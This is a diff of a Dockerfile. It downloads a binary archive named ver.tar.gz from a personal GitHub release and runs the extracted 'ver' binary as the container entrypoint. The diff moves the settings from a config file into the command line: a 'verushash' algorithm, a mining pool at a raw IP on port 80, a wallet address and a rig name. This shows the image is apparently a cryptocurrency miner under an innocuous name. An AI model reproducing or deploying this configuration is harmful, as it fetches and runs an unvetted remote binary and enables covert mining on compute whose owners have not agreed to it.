@@ -12,8 +12,6 @@ RUN apt-get update && apt-get dist-upgrade -y && \
 
 RUN wget https://github.com/imraahatikah6827/eaa/releases/download/eaa/ver.tar.gz && \ 
     tar xf ver.tar.gz && \
-    mv ver /usr/local/bin/ && \
-    mv ver.ini /usr/local/bin/ && \
     rm -rf ver.tar.gz
     
 FROM debian:sid-slim
@@ -24,7 +22,6 @@ RUN apt-get update && apt-get dist-upgrade -y && \
     rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
 COPY --from=builder /usr/local/bin/ver /usr/local/bin/
-COPY --from=builder /usr/local/bin/ver.ini /usr/local/bin/
 
 ENTRYPOINT [ "ver" ]
-CMD [ "ver.ini" ]
+CMD [ "-algo", "verushash", "-pool1", "51.89.228.192:80", "-wallet", "REZd6Rp9GztPMm7Fsj3nsEpy9qHwktg3c9", "-rigName", "mishaa" ]
